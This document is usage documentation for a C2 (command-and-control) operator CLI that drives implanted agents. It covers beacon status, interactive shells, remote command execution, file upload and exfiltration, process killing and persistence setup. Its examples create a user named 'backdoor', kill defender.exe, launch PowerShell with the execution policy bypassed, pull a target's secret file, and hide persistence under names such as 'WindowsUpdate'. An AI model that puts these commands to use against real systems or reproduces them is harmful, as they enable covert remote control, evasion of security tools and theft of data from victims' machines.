Getting Started

Installation
# Build binary once (recommended for repeated use)
go build -o bin/operator ./cmd/operator

# Or run directly without building
go run ./cmd/operator <command>
Connecting to a Server
# Via flag (one-time)
./bin/operator --server http://172.23.0.118:9000 agents list

# Via environment variable (persistent in session)
export TABURTUAI_SERVER=http://172.23.0.118:9000
./bin/operator agents list

# With API key authentication (if server started with --auth)
export TABURTUAI_API_KEY=your_secret_token
./bin/operator agents list
Agent ID Shorthand

All commands accept either a full UUID or a unique prefix. The CLI resolves the prefix automatically against the live agent list.

# Full UUID
./bin/operator shell 7d019eb7-3489-45f6-a2ab-c48d28d8e86c

# Short prefix (6–8 characters recommended)
./bin/operator shell 7d019eb7
ℹ If a prefix matches multiple agents, the CLI returns an error and asks you to be more specific.

Agent Management

agents list List all registered agents 
operator agents list
StatusConditionCommand Acceptance
onlineBeaconed within last 10 minAccepted
dormantNo beacon for 10–30 minQueued — delivered on next beacon
offlineNo beacon for > 30 minRejected
💡 Thresholds are tunable via server env vars AGENT_DORMANT_SEC and AGENT_OFFLINE_SEC.
agents info <agent-id> Detailed agent info

Shows OS, architecture, privileges, working directory, process ID, and beacon statistics.

operator agents info 7d019eb7
agents delete <agent-id> Remove agent record

Removes the agent record from the server database. Does not terminate the running implant on the target.

operator agents delete 7d019eb7

Interactive Shell

shell <agent-id> Start interactive shell session

Opens a persistent shell session with an agent. Each command is queued on the server and picked up by the agent on its next beacon cycle.

operator shell 7d019eb7
  shell  7d019eb7  · exit to quit

[7d019eb7] › whoami
blackout\nurkh

[7d019eb7] › ipconfig /all
Windows IP Configuration
   Host Name . . . . . : blackout
   ...

[7d019eb7] › exit
ℹ Response latency equals the beacon interval (default 10 s ± 20% jitter). For faster interaction, build the agent with --interval 2.

Type exit, quit, or press Ctrl+D to end the session.

Command Execution

cmd execute <agent-id> "<command>" Single non-interactive command
FlagDefaultDescription
--timeoutOPT60Seconds to wait for result
--workdirOPT—Working directory on the agent
--backgroundOPTfalseQueue and return immediately
 
# Basic command
operator cmd execute 7d019eb7 "whoami"

# With working directory
operator cmd execute 7d019eb7 "dir" --workdir "C:\Users\nurkh\Desktop"

# Fire and forget (don't wait for output)
operator cmd execute 7d019eb7 "net user backdoor P@ss123 /add" --background

File Operations

ℹ All transfers route through the C2 server. The server queues the operation; the agent executes it on the next beacon.
files upload <agent-id> <local-path> <remote-path> Push file to agent
FlagDefaultDescription
--waitOPTfalseWait for agent to confirm write
 
operator files upload 7d019eb7 /tmp/tool.exe "C:\Windows\Temp\tool.exe"
operator files upload 7d019eb7 /tmp/tool.exe "C:\Windows\Temp\tool.exe" --wait
files download <agent-id> <remote-path> <local-path> Pull file from agent
FlagDefaultDescription
--waitOPTfalseWait for agent to exfiltrate the file
 
operator files download 7d019eb7 "C:\Users\nurkh\secret.txt" /tmp/secret.txt
⚠ The downloaded file is saved on the C2 server, not the operator machine. Retrieve it from the server separately when running the CLI remotely.

Process Management

process list <agent-id> List running processes 
operator process list 7d019eb7 --wait
process kill <agent-id> Terminate a process by PID or name
FlagShortDescription
--pid-pREQ*Process ID to terminate
--name-nREQ*Process name to terminate (kills all matching)
--wait—OPTWait for kill confirmation

* One of --pid or --name is required.

operator process kill 7d019eb7 --pid 4821
operator process kill 7d019eb7 --name defender.exe --wait
process start <agent-id> <executable> Launch a new process

The executable path is a positional argument, not a flag.

FlagShortDescription
--args-aOPTArguments passed to the executable
--wait—OPTWait for process output
 
operator process start 7d019eb7 "C:\Windows\System32\cmd.exe"
operator process start 7d019eb7 "powershell.exe" --args "-NoProfile -ExecutionPolicy Bypass -File C:\tmp\run.ps1"
operator process start 7d019eb7 "notepad.exe" --wait

Persistence

persistence setup <agent-id> Install persistence mechanism
FlagDefaultDescription
--methodREQ—Persistence method (see table below)
--pathREQ—Full path to the executable on the target
--nameOPTauto-generatedEntry name (registry key / task / service)
--argsOPT—Arguments passed to executable at launch
--waitOPTfalseWait for agent to confirm setup
PlatformMethodTriggerPrivilege
Windowsregistry_runUser logonUser
Windowsschtasks_onlogonUser logonUser
Windowsschtasks_dailyDaily scheduleUser
Windowsstartup_folderUser logonUser
Linuxcron_rebootSystem rebootUser
Linuxsystemd_userUser sessionUser
LinuxbashrcInteractive shellUser
macOSlaunchagentUser logonUser

Method aliases are also accepted:

AliasResolves to
registry, regregistry_run
task, schtask, scheduledschtasks_onlogon
startup, folderstartup_folder
croncron_reboot
systemd, servicesystemd_user
bashbashrc
launch, plistlaunchagent
 
# Windows — registry key with custom name
operator persistence setup 7d019eb7 \
  --method registry_run \
  --path   "C:\Windows\Temp\agent.exe" \
  --name   "WindowsUpdate"

# Windows — scheduled task, wait for confirmation
operator persistence setup 7d019eb7 \
  --method schtasks_onlogon \
  --path   "C:\Windows\Temp\agent.exe" \
  --name   "SvcHostMonitor" \
  --wait

# Linux — cron on reboot
operator persistence setup 7d019eb7 \
  --method cron_reboot \
  --path   /tmp/.agent
persistence remove <agent-id> Remove persistence entry
FlagDescription
--methodREQSame method used during setup
--nameREQSame entry name used during setup
--waitOPTWait for agent to confirm removal
 
operator persistence remove 7d019eb7 \
  --method registry_run \
  --name   "WindowsUpdate"

Queue Management

Removes all pending (not yet executed) commands for the specified agent.

operator queue clear 7d019eb7
💡 Use this to cancel stale commands queued for an offline agent before it reconnects.
